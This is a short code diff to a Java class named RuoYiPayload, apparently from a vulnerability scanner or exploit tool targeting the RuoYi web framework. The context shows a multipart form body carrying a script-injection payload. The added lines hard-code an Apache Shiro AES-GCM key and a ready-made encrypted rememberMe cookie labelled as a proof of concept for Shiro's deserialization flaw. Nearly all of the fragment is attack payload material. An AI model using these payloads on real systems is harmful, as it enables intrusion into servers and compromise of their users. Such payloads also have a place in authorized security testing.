@@ -20,4 +20,8 @@ public class RuoYiPayload {
             "\n" +
             "<script>alert(1)</script>\n" +
             "------WebKitFormBoundary8QopAWpBSNYnTHWH--";
+
+    public static final String SHIRO_KEY_AES_GCM = "zSyK5Kp6PZAAjlT+eeNMlg==";
+
+    public static final String SHIRO_POC = "rememberMe=9W72ZgM4rpzKpaJW28Fb4DUgKTPYIHibzCAlKUxgE7kiGURyNuwXvABc2pyscvk5PUQk+j1talfTEZCL4w1hnGWKVd79A0R4gGr4LLJ1OIt4Yw3Pyw+Nv0aFTKlZ6yPXmkoOuMXfGlZkK+ji2RRs1ndu8SDWgL71LconTlyxZluXBrdWFTve/iwJ9Osyw2e2";
 }
